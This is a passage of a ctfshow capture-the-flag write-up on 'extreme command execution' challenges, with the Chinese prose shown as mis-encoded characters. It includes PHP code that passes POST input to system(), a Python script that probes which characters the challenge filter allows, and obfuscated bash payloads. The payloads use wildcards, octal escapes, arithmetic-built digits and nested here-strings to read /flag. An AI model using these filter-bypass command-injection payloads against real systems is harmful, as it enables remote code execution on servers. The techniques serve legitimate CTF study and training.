alt="image-20230220105114058"></p><p><strong>åªæœ‰è¿™äº›å¯ä»¥è¿›è¡Œåˆ©ç”¨</strong></p><p>è¿™é‡Œé¢˜ç›®æç¤ºçš„ç¯å¢ƒæ˜¯<code>centos7</code>,é‚£ä¹ˆåœ¨è¿™ä¸ªç¯å¢ƒä¸‹æ˜¯å¯ä»¥åˆ©ç”¨/è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ã€‚</p><p><img src="../images/image-20230220105456573.png" alt="image-20230220105456573"></p><p><strong>/getflag</strong>æ˜¯ä¸€ä¸ªphpçš„ç»§æ‰¿ç±»æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¼šè¿”å›1</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å…¨ç§°æ˜¯  /bin/base64 flag.php  è¿™é‡Œæç¤ºçš„æ˜¯æ ¹ç›®å½•ï¼Œæ‰€ä»¥æ˜¯/bin/base64 /flag</span><br><span class="line">payload1ï¼šctf_show=/?????a?</span><br><span class="line">payload2ï¼šctf_show=/???/?a??<span class="number">64</span> /??a?</span><br></pre></td></tr></table></figure><p><strong>è¿™é‡Œè€ƒçš„æ˜¯æ— å­—æ¯è¿›è¡Œrceï¼Œé‚£ä¹ˆå¯ä»¥ctfshowçš„å‘½ä»¤æ‰§è¡Œæ¨¡å—æ‰¾åˆ°</strong></p><h2 id="æé™å‘½ä»¤æ‰§è¡Œ2"><a href="#æé™å‘½ä»¤æ‰§è¡Œ2" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ2"></a>æé™å‘½ä»¤æ‰§è¡Œ2</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶ä¸€ç›´æ²¡åšå‡ºæ¥çš„æŸèµ›æŸé¢˜æ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="comment">//flagåœ¨æ ¹ç›®å½•flagé‡Œï¼Œæˆ–è€…ç›´æ¥è¿è¡Œæ ¹ç›®å½•getflag</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŒ…å«äº†ä¸ªcheck.php,è¿™é‡Œæ˜¯å…ˆæ‰§è¡Œcheck()æ–¹æ³•ï¼Œåœ¨æ‰§è¡Œsystem()æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯èƒ½ä¼šåœ¨checkå¤„è¿›è¡Œç±»ä¼¼die()æ–¹æ³•ä¸€æ ·è¿›è¡Œç»ˆæ­¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—æƒ³åŠæ³•ç»•è¿‡ã€‚</p><p><img src="../images/image-20230220110524677.png" alt="image-20230220110524677"></p><p>æµ‹è¯•çš„æ—¶å€™å‘ç°è¾“å…¥è¢«è¿‡æ»¤çš„å†…å®¹æ—¶ï¼Œä¼šè¿”å›??????ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ä¸ªpythonè„šæœ¬æ¥è·‘ä¸€ä¸‹ï¼Œçœ‹è¿‡æ»¤äº†é‚£äº›å†…å®¹ï¼Œè¿˜æœ‰çœ‹ä¸€ä¸‹å“ªäº›å†…å®¹å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚</p><p><strong>è„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="comment">#è¿™é‡Œå¡«å†™è‡ªå·±çš„é¶æœºç½‘å€</span></span><br><span class="line">url = <span class="string">&quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span>= <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;ctf_show&#x27;</span>:<span class="built_in">chr</span>(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;??????&quot;</span> <span class="keyword">in</span> retext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p>ç­‰1è·‘å®Œçš„æ—¶å€™ï¼Œå°±å¯ä»¥çœ‹åˆ°ç»“æœäº†ã€‚</p><p><img src="../images/image-20230220110934152.png" alt="image-20230220110934152"></p><p>åªæœ‰è¿™äº›å¯ä»¥è¿›è¡Œåˆ©ç”¨ï¼Œå¾ˆæ˜æ˜¾ï¼Œï¼Ÿè¢«è¿‡æ»¤äº†ã€‚</p><p>ç¦ç”¨äº†é—®å·ï¼Œä¸èƒ½ä½¿ç”¨é€šé…ç¬¦çš„æ–¹å¼äº†ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡<code>$&#39;\xxx&#39;</code>çš„æ–¹å¼æ‰§è¡Œå‘½ä»¤ï¼Œå…¶ä¸­xxxæ˜¯asciiå­—æ¯çš„8è¿›åˆ¶å€¼ï¼Œæ¯”å¦‚<code>ls</code> å¯ä»¥é€šè¿‡<code>$&#39;\154\163&#39;</code> çš„æ–¹å¼è¿›è¡Œæ‰§è¡Œã€‚</p><p><img src="../images/image-20230220111453793.png" alt="image-20230220111453793"></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<strong>è¿™ç§æ–¹æ¡ˆå¹¶ä¸èƒ½è§£æå¸¦æœ‰å‚æ•°çš„å‘½ä»¤</strong>ï¼Œæ‰€ä»¥æœ¬é¢˜æä¾›äº†<code>/getflag</code>æ¥æ–¹ä¾¿å¤§å®¶æ‰§è¡Œã€‚</p><p>è¿™ç§é¢˜å…¶å®ä¹Ÿå¯ä»¥ä½¿ç”¨16è¿›åˆ¶è¿›è¡Œåˆ©ç”¨ï¼Œä½†æ˜¯è¿™é‡ŒæŠŠå­—æ¯ç»™è¿‡æ»¤äº†ï¼Œæ‰€ä»¥16è¿›åˆ¶å°±ä¸èƒ½ç”¨äº†  â€”-&gt;  /x53  (16è¿›åˆ¶)</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$<span class="string">&#x27;\57\147\145\164\146\154\141\147&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ—¶getflagæ˜¯é¢˜ç›®ç»™çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥æ„é€ /getflag </p><h2 id="æé™å‘½ä»¤æ‰§è¡Œ3"><a href="#æé™å‘½ä»¤æ‰§è¡Œ3" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ3"></a>æé™å‘½ä»¤æ‰§è¡Œ3</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶ä¸€ç›´æ²¡åšå‡ºæ¥çš„æŸèµ›æŸé¢˜æ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="comment">//flagåœ¨æ ¹ç›®å½•flagé‡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å…ˆè·‘ä¸‹pythonè„šæœ¬ï¼Œçœ‹å“ªäº›è¢«è¿‡æ»¤äº†ã€‚</p><p><img src="../images/image-20230220113626987.png" alt="image-20230220113626987"></p><p>æ•°å­—åªå‰©ä¸‹01å¯ä»¥è¿›è¡Œåˆ©ç”¨äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—æƒ³åˆ«çš„æ–¹æ³•äº†ï¼Œè¿™é‡Œå…ˆæƒ³åˆ°çš„æ˜¯æ„é€ æ•°å­—ï¼Œ<strong>web57</strong>è®²äº†ä¸€ä¸‹</p><p><img src="../images/image-20230220113814158.png" alt="image-20230220113814158"></p><p>å¯ä»¥åˆ©ç”¨è¿™ä¸ªå§¿åŠ¿è¿›è¡Œæ„é€ ã€‚è¿™é‡Œçš„è¯<strong>~</strong>æ˜¯å–åç¬¦å·</p><p>è¿™é‡Œè¡¥å……ä¸€ä¸‹ä¸€ä¸ªçŸ¥è¯†ç‚¹  <a href="https://blog.csdn.net/K346K346/article/details/86752313">Shell åŒå¼•å·å’Œå•å¼•å·çš„åŒºåˆ«</a></p><p>è¿™é‡Œåˆ©ç”¨$~()æ¥æ„é€ æ‰€éœ€è¦çš„æ•°å­—</p><p><strong>pythonè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">r&quot;\ 5 7 \ 1 4 7 \ 1 4 5 \ 1 6 4 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"> </span><br><span class="line">b = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&quot;\\&quot;</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;$((~$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * (<span class="built_in">int</span>(i)+ <span class="number">1</span>) + <span class="string">&quot;))))&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;\\\\&quot;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;$\\&#x27;&quot;</span>+<span class="built_in">str</span>+<span class="string">&quot;\\&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>ä»¥åå¦‚æœæƒ³è¦ä¿®æ”¹å•¥çš„è¯ï¼Œç›´æ¥ä¿®æ”¹aé‡Œé¢çš„å€¼å°±è¡Œäº†ã€‚</p><p>é‚£ä¹ˆå°±å¯ä»¥æ‹¿åˆ°æ„é€ å¥½çš„æ•°å­—äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$\&#x27;\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¤šå‡º\ç¬¦å·æ˜¯è¿›è¡Œè½¬ä¹‰ä½¿ç”¨çš„ã€‚</p><p><img src="../images/image-20230220163149310.png" alt="image-20230220163149310"></p><p>æˆåŠŸè¾“å‡ºæƒ³è¦çš„ä¸œè¥¿</p><p>/getflagçš„å…«è¿›åˆ¶æ¨¡å¼</p><p>ä½†æ˜¯è¿™é‡Œçš„è¯æ˜¯æ²¡æœ‰è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œåªæ˜¯è¿›è¡Œè¾“å‡ºè€Œå·²ã€‚</p><p>è¿™é‡Œå¼•å…¥bashçš„ä¸€ä¸ªè¯­æ³•<code>&lt;&lt;&lt;</code>ä¸‰ä¸ªå°äºå·(here-strings)ï¼Œè¯­æ³•ï¼šcommand [args] &lt;&lt;&lt;[â€œ]$word[â€œ]ï¼›$wordä¼šå±•å¼€å¹¶ä½œä¸ºcommandçš„stdinã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">command &lt;&lt;&lt; string</span><br><span class="line">command æ˜¯ Shell å‘½ä»¤ï¼Œstring æ˜¯å­—ç¬¦ä¸²ã€‚å°†å­—ç¬¦ä¸²é€šè¿‡æ ‡å‡†è¾“å…¥ï¼Œä¼ é€’ç»™å‘½ä»¤</span><br><span class="line">è¿™é‡Œå› ä¸ºå­—æ¯è¢«è¿‡æ»¤äº†ï¼Œbashå°±ç”¨ä¸äº†äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨åˆ«çš„æ–¹æ³•è¿›è¡Œæ›¿ä»£</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0å°±æ˜¯bashçš„å¦ä¸€ä¸ªå†™æ³•</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220163600991.png" alt="image-20230220163600991"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•å»ä½¿ç”¨here-stringsçš„æ–¹æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†</p><p><img src="../images/image-20230220163915706.png" alt="image-20230220163915706"></p><p>è¾“å‡ºäº†1ï¼Œä½†æ˜¯æœ¬é¢˜ç”¨ä¸äº†ï¼Œå› ä¸ºé¢˜ç›®æ²¡æœ‰æç¤ºåœ¨/getflagä¸‹ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å°±åªèƒ½è¿›è¡Œ<strong>cat /flag</strong>äº†</p><p>è¿™é‡Œçš„è¯ï¼Œ$â€™ xxx â€˜æ‰§è¡Œæ—¶ä¸èƒ½ä½¿ç”¨å¸¦å‚çš„æ–¹æ³•çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦è§£å†³è¿™ä¸ªé—®é¢˜çš„è¯å°±å¾—ä½¿ç”¨ä¸¤æ¬¡<strong>here-strings</strong>çš„æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆè¿™é‡Œæ˜¯å› ä¸ºbashæŠŠè¿™ä¸€ä¸ªå­—ç¬¦ä¸²å½“ä½œæ•´ä½“ï¼Œè€Œæ²¡æœ‰æŠŠç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦æ­£ç¡®è§£æï¼‰</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#a = r&quot;\ 5 7 \ 1 4 7 \ 1 4 5 \ 1 6 4 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">r&quot;\ 1 4 3 \ 1 4 1 \ 1 6 4 \ 4 0 \ 5 7 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"></span><br><span class="line">b = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&quot;\\&quot;</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;$((~$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * (<span class="built_in">int</span>(i) + <span class="number">1</span>) + <span class="string">&quot;))))&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;\\\\&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;$\\&#x27;&quot;</span> + <span class="built_in">str</span> + <span class="string">&quot;\\&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>åªéœ€è¦æŠŠaè¿›è¡Œä¿®æ”¹å°±è¡Œäº†</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯ç‰¹æ®Šç‚¹å°±æ˜¯åœ¨ä½¿ç”¨ç¬¬äºŒæ¬¡<strong>here-strings</strong>çš„æ–¹æ³•çš„æ—¶å€™ï¼Œå¾—è¿›è¡Œè½¬ä¹‰å¤„ç†</p><p><strong>å®˜æ–¹wp</strong></p><p><a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc</a>  </p><p>è¿™ä¸ªä½¿ç”¨çš„æ˜¯</p><p>ç¦ç”¨äº†é™¤äº†<code>01</code>ä»¥å¤–çš„æ•°å­—ï¼Œè¿™é‡Œéœ€è¦ç†è§£bashå¯¹äºæ•´æ•°çš„è¡¨ç¤ºå½¢å¼æ˜¯<code>[base#]n</code>çš„å½¢å¼ï¼Œæ¯”æ–¹è¯´å¦‚æœä¸€ä¸ªåè¿›åˆ¶æ•°4ï¼Œå¯ä»¥è¡¨ç¤ºä¸ºäºŒè¿›åˆ¶æ•°100ï¼Œé‚£ä¹ˆåœ¨bashé‡Œå¯ä»¥è¡¨ç¤ºä¸º<code>2#100</code>ã€‚</p><p>æ‰€ä»¥åœ¨ç°æœ‰æ¡ä»¶ä¸‹ï¼Œæˆ‘ä»¬åªè¦é€šè¿‡ä½è¿ç®—<code>$((1&lt;&lt;1))</code>æ„é€ å‡º2ï¼Œå°±å¯ä»¥é€šè¿‡è¿™ç§å½¢å¼æ¥æ„é€ ä»»æ„æ•°å­—äº†ï¼Œæ¯”æ–¹è¯´<code>ls</code>å°±æ˜¯<code>$(($((1&lt;&lt;1))#10011010))     $(($((1&lt;&lt;1))#10100011))</code></p><p><strong>å®˜æ–¹payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span><br></pre></td></tr></table></figure><h2 id="æé™å‘½ä»¤æ‰§è¡Œ4"><a href="#æé™å‘½ä»¤æ‰§è¡Œ4" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ4"></a>æé™å‘½ä»¤æ‰§è¡Œ4</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶ä¸€ç›´æ²¡åšå‡ºæ¥çš„æŸèµ›æŸé¢˜æ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="comment">//flagåœ¨æ ¹ç›®å½•flagé‡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220165224512.png" alt="image-20230220165224512"></p><p>é‡åˆ°è¿‡æ»¤çš„ä¼šè¾“å‡º??????,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¸€ä¸‹è„šæœ¬è·‘ä¸€ä¸‹å“ªäº›ä¸œè¥¿å¯ä»¥è¿›è¡Œåˆ©ç”¨</p><p><strong>è„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œå¡«å†™è‡ªå·±çš„é¶æœºç½‘å€</span></span><br><span class="line">url = <span class="string">&quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;ctf_show&#x27;</span>: <span class="built_in">chr</span>(i)&#125;</span><br><span class="line">    retext = requests.post(url, data=data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;??????&quot;</span> <span class="keyword">in</span> retext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220165407967.png" 